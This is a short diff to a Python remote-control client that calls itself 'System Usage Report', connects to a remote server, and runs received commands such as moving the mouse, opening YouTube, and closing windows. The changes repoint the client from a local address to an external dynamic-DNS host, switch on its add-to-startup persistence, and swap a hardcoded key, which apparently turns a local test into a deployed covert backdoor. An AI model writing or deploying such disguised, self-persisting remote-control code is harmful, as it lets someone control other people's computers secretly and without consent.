@@ -10,11 +10,10 @@ import threading
 import mouse
 import time
 
-key = 's3DrdlnKQqHh67eCYxo2R18NE0trd6ih'
+key = 'unCOFX0GP3tnnQW5bkQbxgY5ZNe2mATM'
 timeout = 60
 
-# host = 'hiddenname.keenetic.pro'
-host = '192.168.1.71'
+host = 'hiddenname.keenetic.pro'
 port = 3142
 
 app_name = 'System Usage Report'
@@ -169,7 +168,12 @@ def open_youtube(cmd):
     return 'OK'
 
 
-# add_to_startup()
+def close_program():
+    keyboard.send('alt+f4')
+    return 'OK'
+
+
+add_to_startup()
 
 while True:
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -194,6 +198,8 @@ while True:
                 send(mouse_cmd_process(command))
             elif command.startswith('youtube'):
                 send(open_youtube(command))
+            elif command.startswith('close'):
+                send(close_program())
             elif command == 'ping':
                 send('pong')
             else:
